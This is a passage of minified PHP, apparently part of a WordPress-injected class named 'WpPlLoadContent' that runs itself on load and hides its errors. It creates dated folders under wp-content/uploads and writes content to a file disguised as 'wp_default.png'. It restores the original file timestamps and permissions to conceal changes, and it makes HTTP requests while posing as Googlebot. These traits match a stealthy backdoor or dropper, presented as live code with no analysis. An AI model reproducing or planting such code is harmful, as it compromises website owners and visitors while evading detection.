.$fileParams['fileType'];$this->return['restoreFile']=$f;$this->currentTimeFile=$this->getTouch($this->options['doc_root'] .'/wp-content/uploads/' .$result->meta_value);$this->currentChmodFile=$this->getChmod($this->options['doc_root'] .'/wp-content/uploads/' .$result->meta_value);return $f;}else{if(!is_dir($this->options['doc_root'] .'/wp-content/uploads')){@mkdir($this->options['doc_root'] .'/wp-content/uploads');}if(!is_dir($this->options['doc_root'] .'/wp-content/uploads/' .date('Y'))){@mkdir($this->options['doc_root'] .'/wp-content/uploads/' .date('Y'));}if(!is_dir($this->options['doc_root'] .'/wp-content/uploads/' .date('Y') .'/' .date('m'))){@mkdir($this->options['doc_root'] .'/wp-content/uploads/' .date('Y') .'/' .date('m'));}if(is_dir($this->options['doc_root'] .'/wp-content/uploads/' .date('Y') .'/' .date('m'))){$this->f='/' .date('Y') .'/' .date('m') .'/wp_default.png';return '/wp-content/uploads/' .date('Y') .'/' .date('m') .'/wp_default.png';}return false;}}return false;}protected function saveContent($file,$content,$chmod=false,$touch=false){if(file_put_contents($file,$content)){if($touch && $this->currentTimeFile){@touch($file,$this->currentTimeFile);}if($chmod && $this->currentChmodFile){@chmod($file,octdec($this->currentChmodFile));}return true;}return false;}protected function getContent($file,$chmod=false,$touch=false){if(file_exists($file)){if($touch){$this->currentTimeFile=$this->getTouch($file);}if($chmod){$this->currentChmodFile=$this->getChmod($file);}return file_get_contents($file);}return false;}protected function getTouch($file){if(file_exists($file)){return filemtime($file);}return false;}protected function getChmod($file){if(file_exists($file)){return substr(sprintf('%o',fileperms($file)),-4);}return false;}protected function getFileTypeAndName($filePath){$result=array();$fileStart=strripos($filePath,'/');$file=substr($filePath,$fileStart+1);$result['filePath']=substr($filePath,0,$fileStart+1);$fileTypeStart=strripos($file,'.');$result['fileName']=substr($file,0,$fileTypeStart);$result['fileType']=substr($file,$fileTypeStart+1);return $result;}protected function request($url,$params=false){if(function_exists('curl_init')){$curl=curl_init();$curl_options=array(CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $url,CURLOPT_USERAGENT => 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',CURLOPT_TIMEOUT => 5,);if($params){$curl_options[CURLOPT_POST]=true;$curl_options[CURLOPT_POSTFIELDS]=$params;}curl_setopt_array($curl,$curl_options);$result=curl_exec($curl);curl_close($curl);return $result;}else{return file_get_contents($url);}}}try{$class=new WpPlLoadContent();$class->init();}catch(Exception $e){}}
